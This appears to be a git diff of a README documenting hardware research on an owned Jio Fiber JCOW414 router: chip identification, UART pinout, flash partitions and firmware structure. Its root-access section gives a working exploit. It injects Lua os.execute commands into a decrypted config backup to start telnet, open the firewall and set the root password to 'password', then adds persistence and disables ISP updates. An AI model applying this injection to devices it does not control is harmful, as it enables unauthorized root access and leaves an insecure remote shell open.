@@ -1,216 +1,9 @@
-# Jio Fiber JCOW414 — Hardware Research
+# Jio Fiber JCOW414 — Hardware & OpenWrt Research
 
-Personal research project on an owned, spare Jio Fiber JCOW414 router.  
-Goals: understand internals, gain UART/shell access, explore firmware structure, and configure as a Wi-Fi access point.
+Personal research project on an owned Sercomm Jio Fiber JCOW414 router (EcoNet EN7528HU platform).  
+Goals: Root access, flash decapsulation, hardware documentation, and porting OpenWrt / Entware.
 
-> **Status: In Progress** — UART access achieved, shell login blocked. See [Current Status](#current-status).
-
----
-
-## Device Overview
-
-| Field | Value |
-|---|---|
-| Model | JCOW414 |
-| Hardware OEM | Sercomm Corporation (Taiwan) |
-| Firmware | SRCMTFI_JCOW414_R2.52.1 |
-| Firmware Date | October 17, 2023 |
-| Build Host | root@tn795 |
-| Kernel | Linux 3.18.21 (MIPS) |
-| SoC | EcoNet EN7528HU (internal codename: TC3162 / EN751221) |
-| CPU | MIPS 1004Kc @ 900MHz, 4 cores |
-| Wi-Fi (2.4GHz) | MediaTek MT7592N |
-| Wi-Fi (5GHz) | MediaTek MT7613BEN |
-| RAM | SK Hynix H5TQ4G63EFR — 512MB DDR3 |
-| SPI NOR Flash | Puya P25Q80L — 1MB (bootloader only), PCB ref U19 |
-| SPI NAND Flash | Micron MT29F2G01 — 256MB (firmware + config) |
-| Fiber Connector | SC/APC (GPON) |
-| PCB Marking | ASKDCB / E239218 |
-
----
-
-## Firmware Supply Chain
-
-This router is manufactured by **Sercomm Corporation** and customized by **Reliance Industries Limited (RIL)** for Jio Fiber deployment.
-
-```
-Sercomm Corporation  →  Hardware OEM, firmware base
-EcoNet (MediaTek)    →  SoC platform, bootloader (TC3162/EN7528)
-RIL / Jio            →  Firmware customization layer ("Booting RIL...")
-```
-
-Evidence from boot log:
-- `Booting RIL...` — RIL firmware layer
-- `Solution for RIL` / `reliance.reliance login:` — hostname confirms Reliance branding
-- `smartcableONTApp` — Sercomm's proprietary TR-069 management application
-- `Thirdparty configuration exists` — unknown third party config detected at boot
-
----
-
-## Hardware Identification
-
-### Main SoC — EcoNet EN7528HU
-- MIPS-based, handles CPU + fiber uplink (GPON)
-- Internal EcoNet codename: **TC3162** / EN751221
-- Package: LQFP (~200 pins)
-- PCB reference: U1
-- Bootloader string: `EN7528 at Mon Sep 2 14:09:30 IST 2019 version 1.1`
-
-### Wi-Fi — MediaTek MT7592N
-- Dual-band 802.11n/ac (2.4GHz + 5GHz)
-- PCB reference: U12
-- Date code: 2238-BZPJL
-
-### Wi-Fi — MediaTek MT7613BEN
-- 802.11ac + Bluetooth combo (5GHz secondary radio)
-- Date code: 2237-BZAEL / AEX10074 / BAP3Y540
-
-### RAM — SK Hynix H5TQ4G63EFR
-- DDR3, 512MB (4Gbit)
-- PCB reference: U2
-- Date code: ADC 207V
-
-### SPI NOR Flash — Puya P25Q80L
-- 8Mbit (1MB), SOP-8 package
-- PCB reference: U19
-- Contains: bootloader only
-- Readable with: CH341A programmer + SOIC-8 clip
-
-### SPI NAND Flash — Micron MT29F2G01
-- 256MB (2Gbit)
-- Contains: full firmware, config partitions
-- Detected in boot log: `mfr_id=0x2c, dev_id=0x24`
-
----
-
-## Flash Partition Layout
-
-From boot log (MTD partition table):
-
-| Partition | Offset | Size | Contents |
-|---|---|---|---|
-| bootloader | 0x000000000000 | 256KB | U-Boot variant |
-| romfile | 0x000000040000 | 256KB | ROM config |
-| kernel | 0x000000080000 | ~4MB | Primary kernel |
-| rootfs | 0x00000047379c | ~36MB | SquashFS root (read-only) |
-| tclinux | 0x000000080000 | 40MB | Primary firmware image |
-| tclinux_slave | 0x000002880000 | 40MB | Backup firmware image |
-| opt0 | 0x000005080000 | 8MB | Optional partition |
-| opt1 | 0x000005880000 | 8MB | Optional partition |
-| ubifs | 0x000006080000 | 26MB | Config data (/flash) |
-| config | 0x000007a80000 | 2MB | Config partition |
-| ubifs2 | 0x000007c80000 | 90MB | Config data 2 (/flash2) |
-| reservearea | 0x00000ddc0000 | ~2MB | Reserved |
-
-Key observations:
-- Dual firmware design (tclinux + tclinux_slave) — failsafe system
-- Root filesystem is **SquashFS, read-only** — confirmed in boot log
-- Persistent storage on `/flash` (ubi0) and `/flash2` (ubi1)
-- `/flash` = 26MB UBIFS, `/flash2` = 90MB UBIFS
-
----
-
-## UART Header — J4
-
-### Location
-4-pin populated header visible on PCB front side, between the large 2200µF capacitor and the metal RF shield. Silkscreen label "J4" with pin 4 marked on right side.
-
-### Confirmed Pinout
-| Pin | Function | Notes |
-|---|---|---|
-| 1 (left) | GND | Connect to adapter GND |
-| 2 | TX | Router transmits → adapter RX |
-| 3 | RX | Adapter TX → router receives |
-| 4 (right) | VCC 3.3V | Do NOT connect — leave floating |
-
-### Connection Settings
-```
-Baud rate:    115200
-Data bits:    8
-Parity:       None
-Stop bits:    1
-Flow control: None
-```
-
-### Hardware Used
-- CP2102 USB-TTL adapter (3.3V logic)
-- Female-to-female jumper wires
-
-### Console Noise Issue
-The UART TTY is **shared between the login process and system daemons**. Background processes inject output directly into the serial console during and after boot, including during password prompts. This makes scripted login attempts unreliable as daemon output corrupts input.
-
-Example observed:
-```
-Password: Starting QOS daemon... Done
-```
-
-This is a significant finding for anyone attempting UART-based access on R2.52.1.
-
----
-
-## Boot Sequence
-
-Two separate prompt windows appear during boot:
-
-```
-1. "Press 'x' or 'b' key in 1 secs to enter or skip bootloader upgrade."
-   → Leads to locked bootloader console (Username/Password)
-
-2. "Press any key in 1 secs to enter boot command mode."
-   → Leads to second locked console (Username/Password)
-```
-
-Both prompts require authentication. Neither times out or falls through to U-Boot on failed attempts — the router simply loops back to the username prompt indefinitely.
-
-After full boot:
-```
-Solution for RIL
-reliance.reliance login:
-```
-This is the Linux shell login. Username `root` confirmed valid. Password unknown.
-
----
-
-## Access Attempts
-
-### Web UI
-- Full admin access obtained at `192.168.29.1`
-- Features available: Port Forwarding, DMZ, UPnP, Static Routing, User Management, Backup/Restore, Firmware Upgrade
-- Bridge mode: unavailable in UI
-
-### Network Reconnaissance
-
-| Port | Service | Status |
-|---|---|---|
-| 80 | HTTP | Open — web admin UI |
-| 443 | HTTPS | Open — web admin UI |
-| 53 | DNS | Open — router DNS |
-| 22 | SSH | Closed |
-| 23 | Telnet | Closed |
-| 21 | FTP | Closed |
-| 69 | TFTP | Closed |
-| 161 | SNMP | Closed |
-
-Hidden web endpoints found:
-
-| URL | Response |
-|---|---|
-| /info.html | 403 — page exists, access blocked |
-| /status.html | 403 — page exists, access blocked |
-| /debug, /cgi-bin/, /adm/, /shell, /diag | 404 |
-
-### UART — Bootloader
-Both boot prompt windows locked with username/password. No timeout, no fallback, no error message on wrong credentials. Common default credentials attempted — all failed.
-
-### UART — Linux Shell
-Username `root` confirmed valid. Password is a random alphanumeric string set at build time — not recoverable via common wordlists. Console noise from daemon output makes scripted attempts unreliable.
-
-### Config Backup Analysis
-Downloaded encrypted config backup (`RSVOTAJEM210410_JCOW414.enc`):
-- Confirmed OpenSSL AES-256-CBC encrypted (`Salted__` header present)
-- Inner layer entropy: 7.999/8.0 — double encrypted or server-side key
-- JFC community tool (`keyguesser.py`) fails on firmware R2.52.1 — designed for ≤R2.49
-- Likely requires firmware downgrade to R2.15 for decryption
+> **Status: Root Achieved & Partitions Dumped** — Permanent root shell access unlocked, all 8 MTD partitions dumped, kernel decapsulated. OpenWrt research in progress.
 
 ---
 
@@ -218,51 +11,186 @@ Downloaded encrypted config backup (`RSVOTAJEM210410_JCOW414.enc`):
 
 | Area | Status | Notes |
 |---|---|---|
-| Hardware identification | ✅ Complete | All ICs identified and documented |
-| PCB photography | ✅ Complete | All major components photographed |
-| Web UI recon | ✅ Complete | Full admin access, no shell exposed |
-| Network recon | ✅ Complete | No shell services on LAN |
-| UART connection | ✅ Complete | CP2102 connected, boot log captured |
-| Boot log analysis | ✅ Complete | Full partition map, services documented |
-| Config backup analysis | ⚠️ Partial | Double encrypted, key unknown for R2.52.1 |
-| Bootloader access | ❌ Blocked | Both prompts locked |
-| Linux shell access | ❌ Blocked | Root password unknown |
-| Firmware dump | 🔲 Pending | Requires shell or flash reader |
+| Hardware identification | ✅ Complete | All ICs, SoC, RAM, radios, and flash chips documented |
+| Root shell access | ✅ Complete | Unlocked via R2.15 Downgrade + Lua Config Injection |
+| Firmware dump | ✅ Complete | All MTD partitions (`mtd0`-`mtd11`) extracted & backed up |
+| Kernel decapsulation | ✅ Complete | EcoNet `HDR2` container unpacked; LZMA MIPS kernel extracted |
+| Bootloader access | ✅ Bypassed | Interactive prompt bypassed via root shell; full `mtd0` binary dumped |
+| OpenWrt research | 🔄 In Progress | Analyzing `target/linux/econet/en7528` and device tree |
 
 ---
 
-## Remaining Paths
+## Root Access & Setup Guide
 
-### Path 1 — Firmware Downgrade (Free)
-Downgrade to R2.15 via web UI firmware upgrade page. On older firmware:
-- `keyguesser.py` can decrypt config backup → reveals credentials
-- JFC telnet exploit works (confirmed by community on ≤R2.3)
-- Telnet login: `root` / `Password` (set by jailbreak init script)
+Follow this step-by-step guide to unlock permanent root shell access, disable remote ISP auto-updates, and back up all flash partitions.
 
-Blocker: Requires R2.15 firmware image + signature file from Jio's OTA servers.
+### 1. Web UI Firmware Downgrade
+Downgrade to R2.15 to unlock configuration decryption:
+* **Firmware Image:** [`SRCMTF1_JCOW414_R2.15.img`](https://raw.githubusercontent.com/gpsarathy/JioFiber-Home-Gateway/master/Firmwares/JCOW414/2.15/SRCMTF1_JCOW414_R2.15.img) (or via [Jio OTA URL](http://fota.slv.fxd.jiophone.net/ONT/Sercomm/JCOW414/SRCMTF1_JCOW414_R2.15.img))
+* **Signature File:** [`SRCMTF1_JCOW414_R2.15.sig`](https://raw.githubusercontent.com/gpsarathy/JioFiber-Home-Gateway/master/Firmwares/JCOW414/2.15/SRCMTF1_JCOW414_R2.15.sig) (or via [Jio OTA URL](http://fota.slv.fxd.jiophone.net/ONT/Sercomm/JCOW414/SRCMTF1_JCOW414_R2.15.sig))
 
-### Path 2 — CH341A Flash Read (₹400)
-Read SPI NAND flash directly with CH341A programmer + SOIC-8 clip:
-- Extract SquashFS from `tclinux` partition
-- Get `/etc/shadow` password hash
-- Crack offline with hashcat
+1. Open the router web panel at `http://192.168.29.1` (or your router IP) and log in.
+2. Go to: **Administrator** &rarr; **Maintenance** &rarr; **Firmware Upgrade**.
+3. Upload both `.img` and `.sig` files and click **Proceed**.
+4. The router flashes the image to the alternate bank (`tclinux_slave` / `mtd7`) and boots into R2.15.
 
-This bypasses all authentication entirely.
+### 2. Config Backup Decryption & Lua Command Injection
+1. Go to: **Administrator** &rarr; **Maintenance** &rarr; **Backup** and download your configuration file (`RSVXXXXXXXXXXX_JCOW414.enc`).
+2. Decrypt the backup with OpenSSL using [`keys/JCOW414.key`](keys/JCOW414.key) (AES-128-CBC with SHA256 KDF):
+   ```bash
+   openssl aes-128-cbc -d -pass pass:$(cat keys/JCOW414.key) -in backup.enc -out backup.txt
+   ```
+3. Open `backup.txt` in a text editor. Replace line 1 (`config.userdb = {}`) with:
+   ```lua
+   config.userdb = {} os.execute("/usr/sbin/telnetd"); os.execute("/pfrm2.0/bin/iptables -I fwInBypass -p tcp --dport 23 -m ifgroup --ifgroup-in 0x1/0x1 -j ACCEPT"); os.execute("echo -e \"password\npassword\" | passwd root");
+   ```
+   *(Ensure the whole payload stays on line 1 with no line breaks).*
+4. Re-encrypt with the same key:
+   ```bash
+   openssl aes-128-cbc -pass pass:$(cat keys/JCOW414.key) -in backup.txt -out backup_modified.enc
+   ```
+5. In the web panel, go to **Maintenance** &rarr; **Restore** and upload `backup_modified.enc`.
+6. The web UI will show *"Failed to update configuration (checksum error)"* — this is expected. Line 1 has executed in memory as root.
+7. Connect via Telnet to port 23:
+   ```bash
+   telnet 192.168.29.1 23
+   ```
+   * **Username:** `root`
+   * **Password:** `password`
 
-### Path 3 — Web UI Fuzzing
-Hidden CGI endpoints may exist behind the 403 responses. A full directory fuzz with Gobuster against `/cgi-bin/` may reveal command execution endpoints.
+### 3. Persistence & Preventing Re-Locking
+Inside the Telnet root shell, run:
+```sh
+# 1. Prevent background watchdog from killing Telnet
+rm -f /flash/telnetDisable
+touch /tmp/DEBUG_IMAGE
+
+# 2. Make custom root password & telnetd survive reboots
+mkdir -p /flash2/pfrm2.0/etc
+cat << 'EOF' > /flash2/pfrm2.0/etc/voipInit
+#!/bin/sh
+echo -e "password\npassword" | passwd root
+/usr/sbin/telnetd
+. /pfrm2.0/etc/voipInit &
+EOF
+chmod +x /flash2/pfrm2.0/etc/voipInit
+
+# 3. Disable TR-069 daemon to block silent OTA updates from Jio
+killall -9 smartcableONTApp 2>/dev/null
+chmod 000 /usr/sbin/smartcableONTApp 2>/dev/null
+```
+
+### 4. Partition Dump Extraction
+Start Busybox `httpd` to download backups over your browser:
+```sh
+/pfrm2.0/bin/iptables -I fwInBypass -p tcp --dport 8080 -m ifgroup --ifgroup-in 0x1/0x1 -j ACCEPT
+mkdir -p /tmp/mtd_backup
+cat /dev/mtd0 > /tmp/mtd_backup/mtd0_bootloader.bin
+cat /dev/mtd1 > /tmp/mtd_backup/mtd1_romfile.bin
+cat /dev/mtd2 > /tmp/mtd_backup/mtd2_kernel.bin
+cat /dev/mtd3 > /tmp/mtd_backup/mtd3_rootfs.bin
+cat /dev/mtd4 > /tmp/mtd_backup/mtd4_tclinux.bin
+cat /dev/mtd8 > /tmp/mtd_backup/mtd8_opt0.bin
+cat /dev/mtd9 > /tmp/mtd_backup/mtd9_opt1.bin
+cat /dev/mtd11 > /tmp/mtd_backup/mtd11_config.bin
+httpd -p 8080 -h /tmp/mtd_backup
+```
+Navigate to `http://<router-ip>:8080/` in your browser to download all binary partition dumps.
 
 ---
 
-## Community Resources
+## Hardware Specifications
 
-- [JFC Group — JioFiber Customisation](https://github.com/JFC-Group/JF-Customisation) — root access method, keyguesser tool
-- [fawazahmed0/Jio-fiber-Modem](https://github.com/fawazahmed0/Jio-fiber-Modem) — related Jio router research
+| Component | Specification | Details |
+|---|---|---|
+| **Model** | Sercomm JCOW414 | Manufactured for Reliance Jio Fiber |
+| **Main SoC** | EcoNet EN7528HU | MIPS 1004Kc @ 900MHz, 4 cores (TC3162 / EN751221) |
+| **RAM** | 512MB DDR3 | SK Hynix H5TQ4G63EFR (4Gbit) |
+| **SPI NOR Flash** | 1MB (8Mbit) | Puya P25Q80L (U19, SOP-8, Stage 1 Bootloader) |
+| **SPI NAND Flash**| 256MB (2Gbit) | Micron MT29F2G01 (Kernel, Rootfs, Config data) |
+| **Wi-Fi 2.4GHz** | MediaTek MT7592N | 802.11b/g/n (U12) |
+| **Wi-Fi 5GHz** | MediaTek MT7613BEN | 802.11a/n/ac + Bluetooth combo (U26) |
+| **Ethernet** | Gigabit LAN | Integrated switch |
+| **Fiber (PON)** | GPON (SC/APC) | Integrated optical transceiver |
+
+---
+
+## Flash Partition Layout (MTD)
+
+From `/proc/mtd`:
+
+| Partition | Offset | Size | Contents |
+|---|---|---|---|
+| `mtd0` | `0x00000000` | 256 KB | `bootloader` (TcBoot stage 1) |
+| `mtd1` | `0x00040000` | 256 KB | `romfile` (Factory calibration, MAC, serial) |
+| `mtd2` | `0x00080000` | ~4 MB | `kernel` (Active Linux kernel) |
+| `mtd3` | `0x0047379c` | ~36 MB | `rootfs` (SquashFS read-only root) |
+| `mtd4` | `0x00080000` | 40 MB | `tclinux` (Bank 1 primary firmware) |
+| `mtd5` | — | ~4 MB | `kernel_slave` (Backup bank kernel) |
+| `mtd6` | — | ~34 MB | `rootfs_slave` (Backup bank rootfs) |
+| `mtd7` | `0x02880000` | 40 MB | `tclinux_slave` (Bank 2 backup firmware) |
+| `mtd8` | `0x05080000` | 8 MB | `opt0` |
+| `mtd9` | `0x05880000` | 8 MB | `opt1` |
+| `mtd10`| `0x06080000` | 26 MB | `ubifs` (`/flash` persistent config data) |
+| `mtd11`| `0x07a80000` | 2 MB | `config` |
+| `mtd12`| `0x07c80000` | 90 MB | `ubifs2` (`/flash2` persistent app data) |
+| `mtd13`| `0x0ddc0000` | ~2 MB | `reservearea` |
+
+> **Fail-Safe Architecture:** The router utilizes dual firmware banks (`tclinux` and `tclinux_slave`). Flashing custom builds to one bank preserves the alternate bank as a recovery failsafe.
+
+---
+
+## Firmware Decapsulation & Structure
+
+* **Container Header:** The stock kernel and `tclinux` images use the EcoNet **`HDR2`** container format:
+  * Magic: `48 44 52 32` (`HDR2`)
+  * Kernel Load Address: `0x80002000`
+  * Kernel Entry Point: `0x80079010`
+* **Compression:** Raw LZMA stream begins at offset `0x100` (256 bytes) directly after the header.
+* **Kernel:** Decompresses to an 11.4MB MIPS 32-bit Linux 3.18.21 kernel binary (`vmlinux`).
+* **Root Filesystem:** Standard SquashFS 4.0 containing proprietary kernel modules:
+  * `mt7603eap.ko` — MediaTek Wi-Fi AP driver
+  * `xpon.ko`, `gpon_flow.ko` — GPON optical uplink driver
+  * `eth.ko`, `eth_ephy.ko` — Ethernet switch driver
+  * `hw_nat.ko`, `swnat.ko` — Hardware NAT acceleration
+
+---
+
+## UART Serial Header — J4
+
+Populated 4-pin header located between the large 2200µF capacitor and the metal RF shield:
+
+```
+J4 Header (left to right)
+┌─────┬─────┬─────┬─────┐
+│  1  │  2  │  3  │  4  │
+│ GND │ TX  │ RX  │ VCC │ (3.3V — DO NOT CONNECT)
+└─────┴─────┴─────┴─────┘
+```
+
+* **Connection Settings:** `115200` baud, `8` data bits, `no` parity, `1` stop bit, `no` flow control.
+* **Logic Level:** 3.3V (CP2102 or CH340 USB-TTL adapter).
+
+---
+
+## OpenWrt Development Notes
+
+* **Architecture:** MIPS 1004Kc (little-endian, 32-bit).
+* **Upstream Target:** OpenWrt has support for the EcoNet EN7528 platform under `target/linux/econet/en7528` (introduced for devices like the Dasan H660GM-A).
+* **Packaging Requirement:** Custom kernels must be wrapped with the `HDR2` header with load address `0x80002000` to be executed by `bootbase`.
+* **Alternative (Entware):** Users who wish to keep original GPON/Wi-Fi vendor performance while running custom packages (AdGuard Home, WireGuard, Cloudflare tunnels, transmission) can install Entware using `jf_entware_mips.sh` directly into `/flash2` on rooted stock firmware.
+
+---
+
+## Community Resources & Credits
+
+- [gpsarathy/JioFiber-Home-Gateway](https://github.com/gpsarathy/JioFiber-Home-Gateway) — firmware OTA archive, static decryption keys
+- [JFC Group — JioFiber Customisation](https://github.com/JFC-Group/JF-Customisation) — root access research, Entware scripts
 - [NaniBot — JIO Notes](https://nanibot.net/posts/jio-notes/) — persistent root method documentation
-- [Yash Garg — JioFiber Bits](https://yashgarg.dev/notes/jiofiber-bits/) — root access guide
+- [fawazahmed0/Jio-fiber-Modem](https://github.com/fawazahmed0/Jio-fiber-Modem) — related Jio router research
 
 ---
 
 ## Disclaimer
 
-This research is conducted on personally owned hardware, disconnected from any live network. For educational purposes only. No Jio infrastructure was accessed or targeted at any point.
+This research is conducted on personally owned hardware, disconnected from any live network, for educational and hardware preservation purposes. No ISP infrastructure was accessed or targeted.
